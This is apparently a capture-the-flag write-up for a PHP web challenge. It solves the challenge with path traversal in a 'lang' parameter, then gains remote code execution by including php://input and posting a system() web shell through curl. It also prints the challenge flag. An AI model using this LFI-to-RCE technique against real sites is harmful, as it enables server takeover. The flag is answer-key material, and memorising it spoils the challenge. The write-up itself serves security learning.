# Streamlined Democracy - web

## Challenge

Before you begin your voting, review our online guide and reach out if you have any questions. Your input is very important to us!

## Solve

Viewing the webpage provided we can see there is an option to toggle language in the top right corner:

s1

When we select French, a `lang` parameter appears in the URL and is set to `fr.php`. It turns out path traversal is possible using this parameter:

streamlined

After much exploring of the filesystem, it appears that we aren't going to be able to find the flag by checking usual locations with generic flag names like `flag.txt`, `flag.php`, `flag` etc. Doing some research led to [this article](https://medium.com/@zoningxtr/from-lfi-to-rce-via-php-input-the-complete-beginner-friendly-guide-e38e79924521) - if getting RCE is possible, we would be able to more effectively explore the filesystem. The use of the PHP I/O stream `input://` strongly aligned with the challenge name and description and we could soon get a solve:

- First confirm we can execute commands with:
  
```bash
curl -X POST -d "<?php system($_GET['cmd']); ?>" \
"http://3.105.27.130:8001/?lang=php://input&cmd=whoami"
```

- `php://input` directs the application to read the raw body of a POST request as a stream. When combined with `include()` in the source - 
    ```php
    $lang = include($language);
    ```
    POST data can be executed as code.
- We send the POST request with the data as PHP code: `"<?php system($_GET['cmd']); ?>"`
  - php `system()` runs local shell commands on the web server
- Then set the `cmd` parameter to whatever we like in the query string

sd.png

- Then find the location of the flag with:

```bash
curl -X POST -d '<?php system($_GET["cmd"]); ?>' \
"http://3.105.27.130:8001/?lang=php://input&cmd=ls+/"
```

sd2

- Then read the flag directly in browser with `lang=/MXypSYzPptJ3_flag.txt`:

sd3

`secedu{pHp_wr@Pp3rs_w1LL_n3veR_d!e}`
